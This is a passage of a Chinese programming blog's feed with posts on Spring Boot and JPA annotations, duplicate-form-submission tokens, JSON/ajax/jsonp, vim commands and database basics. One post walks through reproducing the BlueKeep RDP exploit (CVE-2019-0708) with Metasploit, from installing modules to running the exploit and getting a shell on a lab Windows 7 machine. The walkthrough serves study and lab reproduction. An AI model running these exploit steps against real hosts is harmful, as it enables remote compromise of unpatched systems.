</p><p>@ComponentScan：让spring Boot扫描到Configuration类并把它加入到程序上下文。</p><p> </p><p>@Configuration ：等同于spring的XML配置文件；使用Java代码可以检查类型安全。</p><p> </p><p>@EnableAutoConfiguration ：自动配置。</p><p> </p><p>@ComponentScan ：组件扫描，可自动发现和装配一些Bean。</p><p> </p><p>@Component可配合CommandLineRunner使用，在程序启动后执行一些基础任务。</p><p> </p><p>@RestController：注解是@Controller和@ResponseBody的合集,表示这是个控制器bean,并且是将函数的返回值直 接填入HTTP响应体中,是REST风格的控制器。</p><p> </p><p>@Autowired：自动导入。</p><p> </p><p>@PathVariable：获取参数。</p><p> </p><p>@JsonBackReference：解决嵌套外链问题。</p><p> </p><p> </p><p>@RepositoryRestResourcepublic：配合spring-boot-starter-data-rest使用。</p><p> </p><p>三、JPA注解</p><p> </p><p>@Entity：@Table(name=”“)：表明这是一个实体类。一般用于jpa这两个注解一般一块使用，但是如果表名和实体类名相同的话，@Table可以省略</p><p> </p><p>@MappedSuperClass:用在确定是父类的entity上。父类的属性子类可以继承。</p><p> </p><p>@NoRepositoryBean:一般用作父类的repository，有这个注解，spring不会去实例化该repository。</p><p> </p><p>@Column：如果字段名与列名相同，则可以省略。</p><p> </p><p>@Id：表示该属性为主键。</p><p> </p><p>@GeneratedValue(strategy = GenerationType.SEQUENCE,generator = “repair_seq”)：表示主键生成策略是sequence（可以为Auto、IDENTITY、native等，Auto表示可在多个数据库间切换），指定sequence的名字是repair_seq。</p><p> </p><p>@SequenceGeneretor(name = “repair_seq”, sequenceName = “seq_repair”, allocationSize = 1)：name为sequence的名称，以便使用，sequenceName为数据库的sequence名称，两个名称可以一致。</p><p> </p><p>@Transient：表示该属性并非一个到数据库表的字段的映射,ORM框架将忽略该属性。如果一个属性并非数据库表的字段映射,就务必将其标示为@Transient,否则,ORM框架默认其注解为@Basic。@Basic(fetch=FetchType.LAZY)：标记可以指定实体属性的加载方式</p><p> </p><p>@JsonIgnore：作用是json序列化时将Java bean中的一些属性忽略掉,序列化和反序列化都受影响。</p><p> </p><p>@JoinColumn（name=”loginId”）:一对一：本表中指向另一个表的外键。一对多：另一个表指向本表的外键。</p><p> </p><p>@OneToOne、@OneToMany、@ManyToOne：对应hibernate配置文件中的一对一，一对多，多对一。</p><p> </p><p>四、springMVC相关注解</p><p> </p><p>@RequestMapping：@RequestMapping(“/path”)表示该控制器处理所有“/path”的UR L请求。RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。</p><p> </p><p>用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。该注解有六个属性：</p><p> </p><p>params:指定request中必须包含某些参数值是，才让该方法处理。</p><p> </p><p>headers:指定request中必须包含某些指定的header值，才能让该方法处理请求。</p><p> </p><p>value:指定请求的实际地址，指定的地址可以是URI Template 模式</p><p> </p><p>method:指定请求的method类型， GET、POST、PUT、DELETE等</p><p> </p><p>consumes:指定处理请求的提交内容类型（Content-Type），如application/json,text/html;</p><p> </p><p>produces:指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回</p><p> </p><p>@RequestParam：用在方法的参数前面。</p><p> </p><p>@RequestParam</p><p> </p><p>String a =request.getParameter(“a”)。</p><p> </p><p>@PathVariable:路径变量。如</p><p> </p><p>参数与大括号里的名字一样要相同。</p><p> </p><p>五、全局异常处理</p><p> </p><p>@ControllerAdvice：包含@Component。可以被扫描到。统一处理异常。</p><p> </p><p>@ExceptionHandler（Exception.class）：用在方法上面表示遇到这个异常就执行以下方法。</p><p> </p><p>六、项目中具体配置解析和使用环境</p><p> </p><p>@MappedSuperclass：</p><p> </p><p>1.@MappedSuperclass 注解使用在父类上面，是用来标识父类的</p><p> </p><p>2.@MappedSuperclass 标识的类表示其不能映射到数据库表，因为其不是一个完整的实体类，但是它所拥有的属性能够映射在其子类对用的数据库表中</p><p> </p><p>3.@MappedSuperclass 标识的类不能再有@Entity或@Table注解</p><p> </p><p>@Column：</p><p> </p><p>1.当实体的属性与其映射的数据库表的列不同名时需要使用@Column标注说明，该属性通常置于实体的属性声明语句之前，还可与 @Id 标注一起使用。</p><p> </p><p>2.@Column 标注的常用属性是name，用于设置映射数据库表的列名。此外，该标注还包含其它多个属性，如：unique、nullable、length、precision等。具体如下：</p><p> </p><p>（1） name属性：name属性定义了被标注字段在数据库表中所对应字段的名称</p><p> </p><p>（2） unique属性：unique属性表示该字段是否为唯一标识，默认为false，如果表中有一个字段需要唯一标识，则既可以使用该标记，也可以使用@Table注解中的@UniqueConstraint</p><p> </p><p>（3） nullable属性：nullable属性表示该字段是否可以为null值，默认为true</p><p> </p><p>（4） insertable属性：insertable属性表示在使用”INSERT”语句插入数据时，是否需要插入该字段的值</p><p> </p><p>（5） updateable属性：updateable属性表示在使用”UPDATE”语句插入数据时，是否需要更新该字段的值</p><p> </p><p>（6） insertable和updateable属性：一般多用于只读的属性，例如主键和外键等，这些字段通常是自动生成的</p><p> </p><p>（7） columnDefinition属性：columnDefinition属性表示创建表时，该字段创建的SQL语句，一般用于通过Entity生成表定义时使用，如果数据库中表已经建好，该属性没有必要使用</p><p> </p><p>（8） table属性：table属性定义了包含当前字段的表名</p><p> </p><p>（9） length属性：length属性表示字段的长度，当字段的类型为varchar时，该属性才有效，默认为255个字符</p><p> </p><p>（10）precision属性和scale属性：precision属性和scale属性一起表示精度，当字段类型为double时，precision表示数值的总长度，scale表示小数点所占的位数</p><p> </p><p>具体如下：</p><p> </p><p>double类型将在数据库中映射为double类型，precision和scale属性无效</p><p>double类型若在columnDefinition属性中指定数字类型为decimal并指定精度，则最终以columnDefinition为准</p><p>BigDecimal类型在数据库中映射为decimal类型，precision和scale属性有效</p><p>precision和scale属性只在BigDecimal类型中有效</p><p>3.@Column 标注的columnDefinition属性: 表示该字段在数据库中的实际类型.通常 ORM 框架可以根据属性类型自动判断数据库中字段的类型,但是对于Date类型仍无法确定数据库中字段类型究竟是DATE,TIME还是TIMESTAMP.此外,String的默认映射类型为VARCHAR,如果要将 String 类型映射到特定数据库的 BLOB 或TEXT字段类型.</p><p> </p><p>4.@Column标注也可置于属性的getter方法之前</p><p> </p><p>@Getter和@Setter（Lombok）</p><p> </p><p>@Setter：注解在属性上；为属性提供 setting 方法 @Getter：注解在属性上；为属性提供 getting 方法</p><p> </p><p>1 @Data：注解在类上；提供类所有属性的 getting 和 setting 方法，此外还提供了equals、canEqual、hashCode、toString 方法</p><p> </p><p>2</p><p> </p><p>3 @Setter：注解在属性上；为属性提供 setting 方法</p><p> </p><p>4</p><p> </p><p>5 @Getter：注解在属性上；为属性提供 getting 方法</p><p> </p><p>6</p><p> </p><p>7 @Log4j2 ：注解在类上；为类提供一个 属性名为log 的 log4j 日志对象，和@Log4j注解类似</p><p> </p><p>8</p><p> </p><p>9 @NoArgsConstructor：注解在类上；为类提供一个无参的构造方法</p><p> </p><p>10</p><p> </p><p>11 @AllArgsConstructor：注解在类上；为类提供一个全参的构造方法</p><p> </p><p>12</p><p> </p><p>13 @EqualsAndHashCode:默认情况下，会使用所有非瞬态(non-transient)和非静态(non-static)字段来生成equals和hascode方法，也可以指定具体使用哪些属性。</p><p> </p><p>14</p><p> </p><p>15 @toString:生成toString方法，默认情况下，会输出类名、所有属性，属性会按照顺序输出，以逗号分割。</p><p> </p><p>16</p><p> </p><p>17 @NoArgsConstructor, @RequiredArgsConstructor and @AllArgsConstructor</p><p> </p><p>18 无参构造器、部分参数构造器、全参构造器，当我们需要重载多个构造器的时候，只能自己手写了</p><p> </p><p>19</p><p> </p><p>20 @NonNull：注解在属性上，如果注解了，就必须不能为Null</p><p> </p><p>21</p><p> </p><p>22 @val:注解在属性上，如果注解了，就是设置为final类型，可查看源码的注释知道</p><p> </p><p>当你在执行各种持久化方法的时候，实体的状态会随之改变，状态的改变会引发不同的生命周期事件。这些事件可以使用不同的注释符来指示发生时的回调函数。</p><p> </p><p> </p><p>@javax.persistence.PostLoad：加载后。</p><p> </p><p> </p><p>@javax.persistence.PrePersist：持久化前。</p><p> </p><p> </p><p>@javax.persistence.PostPersist：持久化后。</p><p> </p><p> </p><p>@javax.persistence.PreUpdate：更新前。</p><p> </p><p> </p><p>@javax.persistence.PostUpdate：更新后。</p><p> </p><p> </p><p>@javax.persistence.PreRemove：删除前。</p><p> </p><p> </p><p>@javax.persistence.PostRemove：删除后。</p><p> </p><p>1）数据库查询</p><p> </p><p>@PostLoad事件在下列情况下触发：</p><p> </p><p>执行EntityManager.find()或getreference()方法载入一个实体后。</p><p> </p><p>执行JPQL查询后。</p><p> </p><p>EntityManager.refresh()方法被调用后。</p><p> </p><p>2）数据库插入</p><p> </p><p>@PrePersist和@PostPersist事件在实体对象插入到数据库的过程中发生：</p><p> </p><p>@PrePersist事件在调用persist()方法后立刻发生，此时的数据还没有真正插入进数据库。</p><p> </p><p>@PostPersist事件在数据已经插入进数据库后发生。</p><p> </p><p>3）数据库更新</p><p> </p><p>@PreUpdate和@PostUpdate事件的触发由更新实体引起：</p><p> </p><p>@PreUpdate事件在实体的状态同步到数据库之前触发，此时的数据还没有真正更新到数据库。</p><p> </p><p>@PostUpdate事件在实体的状态同步到数据库之后触发，同步在事务提交时发生。</p><p> </p><p>4）数据库删除</p><p> </p><p>@PreRemove和@PostRemove事件的触发由删除实体引起：</p><p> </p><p>@PreRemove事件在实体从数据库删除之前触发，即在调用remove()方法删除时发生，此时的数据还没有真正从数据库中删除。</p><p> </p><p>@PostRemove事件在实体从数据库中删除后触发。</p><hr>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>防止表单重复提交</title>
    <link href="/2019/09/25/%E9%98%B2%E6%AD%A2%E8%A1%A8%E5%8D%95%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/index/"/>
    <url>/2019/09/25/%E9%98%B2%E6%AD%A2%E8%A1%A8%E5%8D%95%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/index/</url>
    
    <content type="html"><![CDATA[<p>研究了一下如何防止表单提交，结果如下：</p><p>表单提交， 应该是每个网页都会存在的一个内容。比如填写用户信息，填写个人资料。向后台传送数据。那么可能就会有一些捣乱的用户，或者恶意工具服务器的他可能多次点击提交按钮。导致服务器需要解析多次请求</p><p>那么就会出现问题。增加服务器压力。</p><p><strong>解决方案1：</strong></p><p>通过js ，定义一个全局变量。默认是false,当用户点击提交按钮。把全局变量该为true.</p><p>当用户点击第二次提交，会如果是true就不再执行提交。</p><p>代码如下</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> isCommitted = <span class="hljs-literal">false</span>;<span class="hljs-comment">//表单是否已经提交标识，默认为false</span></span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosubmit</span>(<span class="hljs-params"></span>)</span>&#123;</span><span class="javascript"><span class="hljs-keyword">if</span>(isCommitted==<span class="hljs-literal">false</span>)&#123;</span><span class="javascript">isCommitted = <span class="hljs-literal">true</span>;<span class="hljs-comment">//提交表单后，将表单是否已经提交标识设置为true</span></span><span class="javascript"><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//返回true让表单正常提交</span></span><span class="javascript">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="javascript">layer.msg(<span class="hljs-string">&quot;您已经提交过了,信息正在查询请您耐心等待..&quot;</span>)</span><span class="javascript"><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//返回false那么表单将不提交</span></span>&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>其次需要在表单onsubmit=”return dosubmit()”</p><p>用户点击提交之后默认转到该方法下执行代码</p><p>以上一种解决方案，只能解决不懂技术的，小白用户 但是不能从根本上解决问题</p><p>还有一种方式 就是 在服务器做验证。这也是最佳的解决方案 （推荐使用这种方式）</p><p>这种解决方案简单概括就是：</p><p>用户点击跳珠表单页面，会默认生成一个token值。token值可以是uuid+算法生成的唯一值。方式多种多样都可以</p><p>然后把这个token值放入session中，后台可以通过el表达式把通过key拿出token值，存入form表单中的hidden隐藏表单中</p><p>用户每次提交，连同表单数据和这个token值发送到服务器。服务器去校验这个token值。</p><p>首先校验这个token值你要知道有几种情况</p><p>第一种：</p><p>表单中没有token，代表他重复叫</p><p>第二种</p><p>当前session中没有token，则用户代表重复提交</p><p>第三种</p><p>存储在session中的token令牌与表单Token不同，则代表用户重复提交</p><p>每种情况都要考虑进去，</p><p>直接干代码！！不说废话了</p><p>上面几种情况 我会单独 写出一个工具类</p><pre><code class="hljs /\*\*">&#x2F;*** 判断客户端提交上来的令牌和服务器端生成的令牌是否一致* @param args* true:表示重复提交* false:表示没有重复提交*&#x2F;public static boolean isRepeatSubmit(HttpServletRequest request) &#123;String client\_token &#x3D; request.getParameter(&quot;token&quot;);&#x2F;&#x2F;第一种情况，如果提交表单没有token则该用户是重复提交表单if (client\_token &#x3D;&#x3D; null)&#123;return true;&#125;&#x2F;&#x2F;取出来存储在session中的令牌String server\_token &#x3D; (String) request.getSession().getAttribute(&quot;token&quot;);&#x2F;&#x2F;2、如果当前用户的Session中不存在Token(令牌)，则用户是重复提交了表单if (server\_token &#x3D;&#x3D; null)&#123;return true;&#125;&#x2F;&#x2F;3、存储在Session中的Token(令牌)与表单提交的Token(令牌)不同，则用户是重复提交了表单if (!client\_token.equals(server\_token))&#123;return true;&#125;return false;&#125;</code></pre><p><strong>2 跳转页面生产token值</strong></p><pre><code class="hljs reasonml"><span class="hljs-comment">//该方法主要用于跳转JSP页面,并且防止多次提交创建token</span>@<span class="hljs-constructor">RequestMapping(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;findLogisticsPrice&quot;</span>)</span>public String find<span class="hljs-constructor">Logistics(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>)</span>&#123;String token = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TokenUtils</span>.</span></span>get<span class="hljs-constructor">AccessToken(UUID.<span class="hljs-params">randomUUID</span>()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);request.get<span class="hljs-constructor">Session()</span>.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-params">token</span>)</span>;return <span class="hljs-string">&quot;modules/logisticsproviders/freightEstimateIndex&quot;</span>;&#125;生成token值的代码为：<span class="hljs-comment">/**</span><span class="hljs-comment">* 描述：生成Token方法</span><span class="hljs-comment">* @return</span><span class="hljs-comment">*/</span>public static String get<span class="hljs-constructor">AccessToken(String <span class="hljs-params">uuid</span>)</span>&#123;String key = <span class="hljs-string">&quot;UZ&quot;</span>;String timestamp = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span>value<span class="hljs-constructor">Of(System.<span class="hljs-params">currentTimeMillis</span>()</span>);return <span class="hljs-constructor">HMACSHA256((<span class="hljs-params">uuid</span>+<span class="hljs-params">timestamp</span>)</span>.get<span class="hljs-constructor">Bytes()</span>,key.get<span class="hljs-constructor">Bytes()</span>);&#125;</code></pre><p><strong>3 在业务层直接处理逻辑</strong></p><pre><code class="hljs reasonml"><span class="hljs-comment">//判断用户是否是重复提交</span>boolean b = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TokenUtils</span>.</span></span>is<span class="hljs-constructor">RepeatSubmit(<span class="hljs-params">request</span>)</span>;<span class="hljs-keyword">if</span> (b==<span class="hljs-literal">true</span>)&#123;String ze = <span class="hljs-string">&quot;请不要重复提交！！！&quot;</span>;return ze;&#125;</code></pre><p>当业务层逻辑快执行完时候</p><p>//移除session中的token</p><p>request.getSession().removeAttribute(“token”);</p><p>其实还有一种比较简单的方法，加一个加遮罩回调结束后去除，但是这个不建议使用。</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>json ajax与jsonp</title>
    <link href="/2019/09/24/json-ajax%E4%B8%8Ejsonp/index/"/>
    <url>/2019/09/24/json-ajax%E4%B8%8Ejsonp/index/</url>
    
    <content type="html"><![CDATA[<h1 id="json"><a href="#json" class="headerlink" title="json"></a><strong>json</strong></h1><p>json是 JavaScript Object Notation 的首字母缩写，单词的意思是javascript对象表示法，这里说的json指的是类似于javascript对象的一种数据格式，目前这种数据格式比较流行，逐渐替换掉了传统的xml数据格式。</p><p>javascript自定义对象：</p><pre><div class="caption"><span>oMan </span></div><code class="hljs var"> name:&#39;tom&#39;, age:16, talk:function(s)&#123; alert(&#39;我会说&#39;+s); &#125;&#125;</code></pre><p>json格式的数据：</p><pre><code class="hljs &#123;">&#123; &quot;name&quot;:&quot;tom&quot;, &quot;age&quot;:18&#125;</code></pre><p>与json对象不同的是，json数据格式的属性名称和字符串值需要用双引号引起来，用单引号或者不用引号会导致读取数据错误。</p><p>json的另外一个数据格式是数组，和javascript中的数组字面量相同。</p><p>[“tom”,18,”programmer”]</p><h1 id="ajax与jsonp"><a href="#ajax与jsonp" class="headerlink" title="ajax与jsonp"></a><strong>ajax与jsonp</strong></h1><p>ajax技术的目的是让javascript发送http请求，与后台通信，获取数据和信息。ajax技术的原理是实例化xmlhttp对象，使用此对象与后台通信。ajax通信的过程不会影响后续javascript的执行，从而实现异步。</p><p>同步和异步</p><p>现实生活中，同步指的是同时做几件事情，异步指的是做完一件事后再做另外一件事，程序中的同步和异步是把现实生活中的概念对调，也就是程序中的异步指的是现实生活中的同步，程序中的同步指的是现实生活中的异步。</p><p><strong>局部刷新和无刷新</strong></p><p>ajax可以实现局部刷新，也叫做无刷新，无刷新指的是整个页面不刷新，只是局部刷新，ajax可以自己发送http请求，不用通过浏览器的地址栏，所以页面整体不会刷新，ajax获取到后台数据，更新页面显示数据的部分，就做到了页面局部刷新。</p><p><strong>同源策略</strong></p><p>ajax请求的页面或资源只能是同一个域下面的资源，不能是其他域的资源，这是在设计ajax时基于安全的考虑。特征报错提示：</p><p>XMLHttpRequest cannot load <a href="https://www.baidu.com/">https://www.baidu.com/</a>. No<br>‘Access-Control-Allow-Origin’ header is present on the requested resource.<br>Origin ‘null’ is therefore not allowed access.</p><p><strong>$.ajax使用方法</strong></p><p>常用参数：</p><p>1、url 请求地址</p><p>2、type 请求方式，默认是’GET’，常用的还有’POST’</p><p>3、dataType 设置返回的数据格式，常用的是’json’格式，也可以设置为’html’</p><p>4、data 设置发送给服务器的数据</p><p>5、success 设置请求成功后的回调函数</p><p>6、error 设置请求失败后的回调函数</p><p>7、async 设置是否异步，默认值是’true’，表示异步</p><p>以前的写法：</p><pre><code class="hljs $.ajax(&#123;"> url: &#39;js&#x2F;data.json&#39;, type: &#39;GET&#39;, dataType: &#39;json&#39;, data:&#123;&#39;aa&#39;:1&#125; success:function(data)&#123; alert(data.name); &#125;, error:function()&#123; alert(&#39;服务器超时，请重试！&#39;); &#125;&#125;);</code></pre><p>新的写法(推荐)：</p><pre><code class="hljs $.ajax(&#123;"> url: &#39;js&#x2F;data.json&#39;, type: &#39;GET&#39;, dataType: &#39;json&#39;, data:&#123;&#39;aa&#39;:1&#125;&#125;).done(function(data) &#123; alert(data.name);&#125;).fail(function() &#123; alert(&#39;服务器超时，请重试！&#39;);&#125;);&#x2F;&#x2F; data.json里面的数据： &#123;&quot;name&quot;:&quot;tom&quot;,&quot;age&quot;:18&#125;</code></pre><p><strong>练习</strong></p><p>制作首页用户信息读取</p><p>jsonp</p><p>ajax只能请求同一个域下的数据或资源，有时候需要跨域请求数据，就需要用到jsonp技术，jsonp可以跨域请求数据，它的原理主要是利用了</p><pre><code class="hljs $.ajax(&#123;"> url:&#39;js&#x2F;data.js&#39;, type:&#39;get&#39;, dataType:&#39;jsonp&#39;, jsonpCallback:&#39;fnBack&#39;&#125;).done(function(data)&#123; alert(data.name);&#125;).fail(function() &#123; alert(&#39;服务器超时，请重试！&#39;);&#125;);&#x2F;&#x2F; data.js里面的数据： fnBack(&#123;&quot;name&quot;:&quot;tom&quot;,&quot;age&quot;:18&#125;);</code></pre><p><strong>实例</strong></p><p>获取360搜索关键词联想数据</p><pre><code class="hljs $(function()&#123;"> $(&#39;#txt01&#39;).keyup(function()&#123; var sVal &#x3D; $(this).val(); $.ajax(&#123; url:&#39;https:&#x2F;&#x2F;sug.so.360.cn&#x2F;suggest?&#39;, type:&#39;get&#39;, dataType:&#39;jsonp&#39;, data: &#123;word: sVal&#125; &#125;) .done(function(data)&#123; var aData &#x3D; data.s; $(&#39;.list&#39;).empty(); for(var i&#x3D;0;i&lt;aData.length;i++) &#123; var $li &#x3D; $(&#39;&lt;li&gt;&#39;+ aData\[i\] +&#39;&lt;&#x2F;li&gt;&#39;); $li.appendTo($(&#39;.list&#39;)); &#125; &#125;)  &#125;)&#125;)&#x2F;&#x2F;......&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;&quot; id&#x3D;&quot;txt01&quot;&#x2F;&gt;&lt;ul class&#x3D;&quot;list&quot;&gt;&lt;&#x2F;ul&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vim编辑器命令</title>
    <link href="/2019/09/23/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4/index/"/>
    <url>/2019/09/23/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4/index/</url>
    
    <content type="html"><![CDATA[<p>vim编辑器有3种模式，命令模式、输入模式、末行模式。</p><p>例如:在/root路径下面有一个123.txt文件。首先使用命令打开文件 vim /root/123.txt 便进入了命令模式</p><p>然后在键盘上按下i键（表示insert）,可以修改文件输入其他文本信息，便进入了输入模式</p><p>然后按下键盘ECS键，便进入了末行模式，末行模式支持也支持很多命令，例如:wq命令就是保存并退出。</p><h1 id="常见的使用说明"><a href="#常见的使用说明" class="headerlink" title="常见的使用说明"></a><strong>常见的使用说明</strong></h1><p><strong>命令模式：</strong></p><p>#命令模式-&gt;打开文件，如果有就打开文件内容，没有就新增该文件。<br>vim /root/123.txt<br>#命令模式-&gt;光标移动，键盘上的hjkl四个键<br>K（或者方向上键）：向上移动光标<br>h（或者方向左键）：向左移动光标<br>l（或者方向右键）：向右移动光标<br>J（或者方向下键）：向下移动光标<br>#命令模式-&gt;翻页命令<br>Ctrl+F：向前翻整页<br>Ctrl+U：向前翻半页<br>Ctrl+B：向后翻整页<br>Ctrl+D：向后翻半页<br>#命令模式-&gt;行内快速跳转^：移动到本行行首<br>$：移动到本行行尾<br>#命令模式-&gt;跳转到指定行<br>1G（或者1GG）：跳转到文件首行。<br>G（或者GG）跳转到尾行<br>#G（或者#GG）跳转到文件的#行<br>#命令模式-&gt;编辑操作<br>I：插入命令 A：附加命令<br>O：打开命令 C：修改命令<br>r：取代命令 S：替换命令<br>Esc：退出命令</p><p><strong>输入模式：</strong></p><p>#输入模式-&gt;操作<br>Home：光标到行首<br>End：光标到行尾<br>Page Up、Page Down：上下翻页<br>Delecte：删除光标位置的字符</p><p><strong>末行模式：</strong></p><p>#末行模式-&gt;显示行号或者取消行号<br>set n：显示行号<br>set nonu：取消行号<br>#末行模式-&gt;保存文件<br>:w#末行模式-&gt;退出<br>:q<br>#末行模式-&gt;强制退出<br>:!q<br>#末行模式-&gt;保存并退出<br>:wq</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>rdp漏洞复现</title>
    <link href="/2019/09/19/rdp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/"/>
    <url>/2019/09/19/rdp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/</url>
    
    <content type="html"><![CDATA[<blockquote><p>警告：禁止用于非法用途，仅为学习使用</p></blockquote><p> </p><p><strong>环境</strong></p><p>Windows 7 sp1</p><p>Kali</p><p>exp</p><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a><strong>0x02 利用</strong></h1><p>1.一键安装metasploit-framework</p><p>curl <a href="https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</a> &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</p><p>2.下载Reference中的攻击套件放置文件到msf的相应文件夹</p><p>rdp.rb -&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb<br>rdp_scanner.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb<br>cve_2019_0708_bluekeep.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb<br>cve_2019_0708_bluekeep_rce.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</p><p>msf命令：</p><p>使用msfconsole进入metasploit-framework ，<strong>reload_all</strong>重新加载0708rdp利用模块</p><p>使用use exploit/windows/rdp/cve_2019_0708_bluekeep_rce启用0708RDP攻击模块</p><p>使用set RHOSTS 设置受害机IP</p><p>使用set RPORT 设置受害机RDP端口号</p><p>使用set target ID数字(可选为0-4)设置受害机机器架构</p><p>我使用的是Parallels Desktop,设置target 1</p><p>使用exploit开始攻击,等待建立连接</p><p>建立连接以后,使用shell获得shell,再使用python获得交互式shell,执行whoami</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库基础</title>
    <link href="/2019/08/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/index/"/>
    <url>/2019/08/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/index/</url>
    
    <content type="html"><![CDATA[<p>为什么要使用数据库</p><p> </p><p>因为使用io流文件存储数据有很多弊端：</p><p> </p><p>1、文件存储数据存储效率低；</p><p> </p><p>2、不管存还取操作比较麻烦</p><p> </p><p>3、一般只能保存小量字符串数据等。</p><p> </p><p>为了解决这些弊端，才有数据库的出现，使用数据库存储数据就可以很好的解决这些弊端。</p><p> </p><p> </p><p>4.数据库管理系统（Batabase Management System，DBMS）：用来管理数据库的计算机系统。</p><p> </p><p>5关系型数据库（Relational Database，RDB）：目前应用最广泛的数据库。</p><p> </p><p>6结构化查询语言（Structured Query Language，SQL）：专门用于操作 RDB。</p><p> </p><p>7.常见的 5 种关系型数据库管理系统（Relational Database Management System，RDBMS）：</p><p> </p><p>①Oracle Database：甲骨文公司</p><p> </p><p>②SQL Server：微软公司</p><p> </p><p>③DB2：IBM 公司</p><p> </p><p>④PostgreSQL：开源</p><p> </p><p>⑤MySQL：开源</p><p> </p><p>一、数据库结构</p><p> </p><p>1.服务器：用于接收并处理其它程序发出的请求的程序（软件），或者是安装此类程序的设备（计算机）。</p><p> </p><p>2.客户端：向服务器发出请求的程序（软件），或者是安装此类程序的设备（计算机）。</p><p> </p><p> </p><p>3.表（table）：类似 Excel，由行和列组成的二维表。</p><p> </p><p>4.字段：表的列（垂直方向）。</p><p> </p><p>5.记录：表的行（水平方向）。【注意】关系数据库必须以行为单位进行数据读写。</p><p> </p><p>6.单元格：行列交汇处。【注意】与 Excel 不同，一个单元格只能输入一个数据。</p><p> </p><p>二、SQL 概要</p><p> </p><p>1.SQL 语句：用关键字、表名和列名等组合而成的一条语句。</p><p> </p><p>2.3 种 SQL 语句种类：</p><p> </p><p>（1）DDL（Data Definition Language，数据定义语言）：创建、删除或修改数据库以及数据库中的表等对象。</p><p> </p><p>①CREATE：创建数据库和表等对象</p><p> </p><p>②DROP：删除数据库和表等对象</p><p> </p><p>③ALTER：修改数据库和表等对象</p><p> </p><p>（2）DML（Data Manipulation Language，数据操作语言）：查询或修改表中的记录。</p><p> </p><p>①SELECT：查询表中的数据</p><p> </p><p>②INSERT：向表中插入数据</p><p> </p><p>③UPDATE：修改表中的数据</p><p> </p><p>④DELETE：删除表中的数据</p><p> </p><p>（3）DCL（Data Control Language，数据控制语言）：确认或取消对数据库中的数据变更的执行操作，以及对用户的操作数据库中的对象权限进行设定。</p><p> </p><p>①COMMIT：确认对数据库中的数据进行的变更</p><p> </p><p>②ROLLBACK：取消对数据库中的数据进行的变更</p><p> </p><p>③GRANT：赋予用户的操作权限</p><p> </p><p>④REVOKE：取消用户的操作权限</p><p> </p><p>【备注】DML 使用最频繁。</p><p> </p><p>3.SQL 语句书写规范：</p><p> </p><p>①以分号（；）结尾；</p><p> </p><p>②大小写不敏感，不区分关键字的大小写；【注意】插入到表中的数据是区分大小写的，如“HI”、“Hi”和“hi”都不同。</p><p> </p><p>③该系列随笔将采用“关键字大写，表名和列名的首字母大写”的格式。</p><p> </p><p>④单词使用半角空格或换行符隔开</p><p> </p><p>4.常数的书写方式：</p><p> </p><p>字符串、日期：用单引号括起来（’），如’Hello’，’2016-09-24’。</p><p> </p><p>数字：直接书写，不用加单引号，如：5。</p><p> </p><p>三、创建数据库与表</p><p> </p><p>1.数据库创建：</p><p> </p><p>-- 语法：CREATE DATABASE &lt;数据库名称&gt;</p><p>CREATE DATABASE Shop – 创建名为 Shop 的数据库</p><p> </p><p>2.表的创建</p><p> </p><p>-- 语法：</p><p>-- CREATE TABLE &lt;表名&gt;</p><p>-- (</p><p>-- &lt;列名1&gt; &lt;数据类型&gt; 